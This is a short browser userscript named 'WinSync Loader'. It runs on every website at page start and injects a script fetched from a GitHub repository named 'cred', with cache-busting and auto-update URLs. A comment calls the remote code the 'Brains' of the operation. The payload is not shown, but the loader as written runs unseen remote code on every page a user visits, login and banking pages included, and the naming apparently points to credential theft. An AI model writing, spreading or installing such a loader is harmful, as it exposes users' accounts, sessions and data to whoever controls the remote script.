// ==UserScript==
// @name         WinSync Loader
// @namespace    http://tampermonkey.net/
// @version      1.0.1
// @match        *://*/*
// @grant        none
// @run-at       document-start
// @downloadURL  https://raw.githubusercontent.com/09sychic/cred/main/winsync.user.js
// @updateURL    https://raw.githubusercontent.com/09sychic/cred/main/winsync.user.js
// ==/UserScript==

(function() {
    const s = document.createElement('script');
    // This pulls the actual "Brains" of the operation
    s.src = "https://cdn.jsdelivr.net/gh/09sychic/cred@main/winsync.js?t=" + Date.now();
    (document.head || document.documentElement).appendChild(s);
})();
